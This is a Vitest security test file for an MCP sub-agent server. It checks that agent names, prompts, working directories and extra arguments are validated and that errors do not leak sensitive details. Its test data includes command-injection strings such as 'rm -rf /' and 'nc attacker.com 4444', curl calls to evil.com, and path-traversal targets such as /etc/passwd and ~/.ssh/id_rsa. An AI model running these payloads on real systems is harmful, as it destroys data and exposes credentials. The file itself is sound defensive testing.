import fs from 'node:fs/promises'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { afterAll, beforeAll, describe, expect, test, vi } from 'vitest'
import { AgentManager } from '../../agents/AgentManager.js'
import { ServerConfig } from '../../config/ServerConfig.js'
import { AgentExecutor, createExecutionConfig } from '../../execution/AgentExecutor.js'
import { McpServer } from '../../server/McpServer.js'

vi.mock('node:child_process', () => ({
  spawn: vi.fn(),
}))

import { spawn } from 'node:child_process'

const mockSpawn = vi.mocked(spawn)

describe('Security Validation Tests', () => {
  let testAgentsDir: string
  let server: McpServer
  let config: ServerConfig
  let agentManager: AgentManager
  let agentExecutor: AgentExecutor

  beforeAll(async () => {
    vi.clearAllMocks()

    mockSpawn.mockImplementation((_cmd: string, args: readonly string[], options: any) => {
      const promptIndex = args.indexOf('-p')
      const _prompt = promptIndex >= 0 && promptIndex < args.length - 1 ? args[promptIndex + 1] : ''

      const mockProcess = {
        stdin: {
          end: vi.fn(),
        },
        stdout: {
          on: vi.fn((event, callback) => {
            if (event === 'data') {
              callback(
                Buffer.from(
                  `${JSON.stringify({
                    type: 'result',
                    result: 'Security test execution',
                  })}\n`
                )
              )
            }
          }),
        },
        stderr: {
          on: vi.fn((event, callback) => {
            if (event === 'data') {
              if (options?.cwd?.includes('../../../etc')) {
                callback(Buffer.from('Invalid directory path'))
              }
            }
          }),
        },
        on: vi.fn((event, callback) => {
          if (event === 'close') {
            if (options?.cwd?.includes('../../../etc')) {
              callback(1) // Error exit code for invalid cwd
            } else {
              callback(0) // Success
            }
          } else if (event === 'error') {
          }
        }),
        kill: vi.fn(),
        killed: false,
      }

      return mockProcess as any
    })

    testAgentsDir = path.join(tmpdir(), 'mcp-security-test-agents')
    await fs.mkdir(testAgentsDir, { recursive: true })

    await fs.writeFile(
      path.join(testAgentsDir, 'valid-agent.md'),
      `# Valid Agent\n\nLegitimate test agent.\n\nUsage: echo "Valid execution"`
    )

    await fs.writeFile(
      path.join(testAgentsDir, 'secure-agent.md'),
      `# Secure Agent\n\nAgent for security testing.\n\nUsage: echo "Security test"`
    )

    const outsideDir = path.join(tmpdir(), 'mcp-outside-agents')
    await fs.mkdir(outsideDir, { recursive: true })
    await fs.writeFile(
      path.join(outsideDir, 'malicious-agent.md'),
      '# Malicious Agent\n\nShould not be accessible.\n\nUsage: rm -rf /'
    )

    process.env.SERVER_NAME = 'security-test-server'
    process.env.AGENTS_DIR = testAgentsDir
    process.env.AGENT_TYPE = 'cursor'

    config = new ServerConfig()

    server = new McpServer(config)
    agentManager = new AgentManager(config)
    const executionConfig = createExecutionConfig('cursor')
    agentExecutor = new AgentExecutor(executionConfig)

    await server.start()
  })

  afterAll(async () => {
    await server.close()

    await fs.rm(testAgentsDir, { recursive: true, force: true })
    const outsideDir = path.join(tmpdir(), 'mcp-outside-agents')
    await fs.rm(outsideDir, { recursive: true, force: true }).catch(() => {})
  })

  describe('Input Validation Security', () => {
    test('rejects empty agent name', async () => {
      await expect(agentManager.getAgent('')).rejects.toThrow(/invalid|empty|agent name/i)
    })

    test('rejects null/undefined agent name', async () => {
      await expect(agentManager.getAgent(null as any)).rejects.toThrow(/invalid|null|agent name/i)

      await expect(agentManager.getAgent(undefined as any)).rejects.toThrow(
        /invalid|undefined|agent name/i
      )
    })

    test('rejects agent names with invalid characters', async () => {
      const invalidNames = [
        '../malicious-agent',
        '..\\malicious-agent',
        'agent/with/slashes',
        'agent\\with\\backslashes',
        'agent with spaces',
        'agent\nwith\nnewlines',
        'agent\x00with\x00nulls',
        '<script>alert("xss")</script>',
        '$(rm -rf /)',
        '`rm -rf /`',
        '; rm -rf /',
        '&& rm -rf /',
        '| rm -rf /',
      ]

      for (const invalidName of invalidNames) {
        await expect(agentManager.getAgent(invalidName)).rejects.toThrow(
          /invalid|forbidden|agent name/i
        )
      }
    })

    test('rejects extremely long agent names', async () => {
      const longName = 'a'.repeat(1000)
      await expect(agentManager.getAgent(longName)).rejects.toThrow(/invalid|too long|agent name/i)
    })

    test('validates execution parameters', async () => {
      await expect(agentExecutor.executeAgent(null as any)).rejects.toThrow(
        /invalid|null|parameters/i
      )

      const result = await agentExecutor.executeAgent({
        agent: 'valid-agent',
        prompt: 'Test',
        cwd: '../../../etc',
        extra_args: [],
      })

      expect(result.exitCode).toBeGreaterThan(0)
      expect(result.stderr).toBeDefined()
    })

    test('sanitizes prompt input', async () => {
      const _agent = await agentManager.getAgent('valid-agent')

      const maliciousPrompts = [
        'test && rm -rf /',
        'test; cat /etc/passwd',
        'test | nc attacker.com 4444',
        'test `curl evil.com`',
        'test $(curl evil.com)',
        'test\nrm -rf /',
        'test\x00rm -rf /',
      ]

      for (const maliciousPrompt of maliciousPrompts) {
        const result = await agentExecutor.executeAgent({
          agent: 'valid-agent',
          prompt: maliciousPrompt,
          cwd: process.cwd(),
        })

        expect(result).toBeDefined()
        expect(result.exitCode).toBeDefined()
      }
    }, 30000) // 30 seconds timeout for multiple agent executions
  })

  describe('Path Traversal Prevention', () => {
    test('prevents access to files outside agents directory', async () => {
      const pathTraversalAttempts = [
        '../outside-agent',
        '../../outside-agent',
        '../../../etc/passwd',
        '..\\outside-agent',
        '..\\..\\outside-agent',
        '/etc/passwd',
        'C:\\Windows\\System32\\config\\SAM',
        '~/.ssh/id_rsa',
        '/tmp/../etc/passwd',
        'agent/../../../etc/passwd',
      ]

      for (const maliciousPath of pathTraversalAttempts) {
        await expect(agentManager.getAgent(maliciousPath)).rejects.toThrow(
          /not found|forbidden|invalid path/i
        )
      }
    })

    test('prevents symbolic link traversal', async () => {
      const linkPath = path.join(testAgentsDir, 'malicious-link.md')
      const outsidePath = path.join(tmpdir(), 'mcp-outside-agents', 'malicious-agent.md')

      try {
        await fs.symlink(outsidePath, linkPath)

        await expect(agentManager.getAgent('malicious-link')).rejects.toThrow(
          /forbidden|symlink|traversal/i
        )
      } catch (_error) {
        expect(true).toBe(true)
      } finally {
        await fs.unlink(linkPath).catch(() => {})
      }
    })

    test('ensures agent files are within allowed directory', async () => {
      const agent = await agentManager.getAgent('valid-agent')
      if (!agent) {
        throw new Error('Expected valid-agent to be available for path validation')
      }

      expect(agent.filePath).toContain(testAgentsDir)
      const resolvedAgentPath = await fs.realpath(agent.filePath)
      const resolvedTestDir = await fs.realpath(testAgentsDir)
      expect(path.relative(resolvedTestDir, resolvedAgentPath).startsWith('..')).toBe(false)
    })
  })

  describe('Resource Limit Security', () => {
    test('enforces maximum concurrent executions', async () => {
      const _agent = await agentManager.getAgent('valid-agent')

      const maxConcurrent = 5 // Default concurrent execution limit
      const excessiveExecutions = Array.from({ length: maxConcurrent + 2 }, (_, i) =>
        agentExecutor.executeAgent({
          agent: 'valid-agent',
          prompt: `Concurrent test ${i + 1}`,
          cwd: process.cwd(),
        })
      )

      const results = await Promise.allSettled(excessiveExecutions)

      const successful = results.filter((r) => r.status === 'fulfilled').length
      const failed = results.filter((r) => r.status === 'rejected').length

      expect(successful).toBeGreaterThan(0)
      expect(successful + failed).toBe(excessiveExecutions.length)
    })

    test('prevents excessive memory usage through output size limits', async () => {
      await fs.writeFile(
        path.join(testAgentsDir, 'large-output-agent.md'),
        '# Large Output Agent\n\nProduces large output for testing.\n\nUsage: yes | head -n 100000'
      )

      const _agent = await agentManager.getAgent('large-output-agent')

      const result = await agentExecutor.executeAgent({
        agent: 'large-output-agent',
        prompt: 'Large output security test',
        cwd: process.cwd(),
      })

      expect(result).toBeDefined()
      expect(result.exitCode).toBeDefined()
    })
  })

  describe('Information Disclosure Prevention', () => {
    test('error messages do not reveal sensitive system information', async () => {
      try {
        await agentManager.getAgent('non-existent-agent')
        expect.fail('Should have thrown an error')
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : String(error)

        expect(errorMessage).not.toMatch(/\/[a-zA-Z0-9/._-]+\/[a-zA-Z0-9/._-]+/) // No absolute paths
        expect(errorMessage).not.toContain(process.env.HOME || '/home')
        expect(errorMessage).not.toContain(process.env.USER || 'user')
        expect(errorMessage).not.toContain('password')
        expect(errorMessage).not.toContain('token')
        expect(errorMessage).not.toContain('secret')
      }
    })

    test('execution results do not leak environment variables', async () => {
      const _agent = await agentManager.getAgent('valid-agent')

      const result = await agentExecutor.executeAgent({
        agent: 'valid-agent',
        prompt: 'Environment security test',
        cwd: process.cwd(),
      })

      const allOutput = result.stdout + result.stderr
      expect(allOutput).not.toContain(process.env.HOME || '/home')
      expect(allOutput).not.toContain(process.env.PATH || 'PATH=')

      const sensitiveEnvVars = ['PASSWORD', 'TOKEN', 'SECRET', 'KEY', 'CREDENTIAL']
      for (const envVar of sensitiveEnvVars) {
        expect(allOutput).not.toMatch(new RegExp(`${envVar}=`, 'i'))
      }
    })

    test('logs do not contain sensitive information', async () => {
      const _agent = await agentManager.getAgent('valid-agent')

      const result = await agentExecutor.executeAgent({
        agent: 'valid-agent',
        prompt: 'Logging security test with sensitive data: password123',
        cwd: process.cwd(),
      })

      expect(result.exitCode).toBeDefined()
    })
  })

  describe('Recursion Prevention Security', () => {
    test('recursion warning prevents infinite loops', async () => {
      const _agent = await agentManager.getAgent('valid-agent')

      const result = await agentExecutor.executeAgent({
        agent: 'valid-agent',
        prompt: 'Test recursion prevention: run_agent tool call',
        cwd: process.cwd(),
      })

      expect(result).toBeDefined()
      expect(result.exitCode).toBeDefined()
    })

    test('prevents nested MCP server calls', async () => {
      const _agent = await agentManager.getAgent('valid-agent')

      const result = await agentExecutor.executeAgent({
        agent: 'valid-agent',
        prompt: 'Execute: run_agent tool with sub-agents-mcp server',
        cwd: process.cwd(),
      })

      expect(result.exitCode).toBeDefined()
    })
  })

  describe('Command Injection Prevention', () => {
    test('prevents shell command injection through agent names', async () => {
      const maliciousAgentNames = [
        'valid-agent; rm -rf /',
        'valid-agent && cat /etc/passwd',
        'valid-agent | nc attacker.com 4444',
        '`curl evil.com`',
        '$(curl evil.com)',
        'valid-agent\nrm -rf /',
        'valid-agent\x00rm -rf /',
      ]

      for (const maliciousName of maliciousAgentNames) {
        await expect(agentManager.getAgent(maliciousName)).rejects.toThrow(
          /invalid|forbidden|agent name/i
        )
      }
    })

    test('prevents command injection through extra_args', async () => {
      const _agent = await agentManager.getAgent('valid-agent')

      const maliciousArgs = [
        '; echo "INJECTION_SUCCESSFUL"',
        '&& echo "INJECTION_SUCCESSFUL"',
        '| echo "INJECTION_SUCCESSFUL"',
        '`echo "INJECTION_SUCCESSFUL"`',
        '$(echo "INJECTION_SUCCESSFUL")',
      ]

      for (const maliciousArg of maliciousArgs) {
        const result = await agentExecutor.executeAgent({
          agent: 'valid-agent',
          prompt: 'Command injection test',
          cwd: process.cwd(),
          extra_args: [maliciousArg],
        })

        expect(result).toBeDefined()
        expect(result.exitCode).toBeDefined()

        const allOutput = result.stdout + result.stderr

        expect(allOutput).not.toMatch(/INJECTION_SUCCESSFUL/)

        expect(allOutput).not.toMatch(/^INJECTION_SUCCESSFUL$/m)
      }
    }, 15000)
  })
})
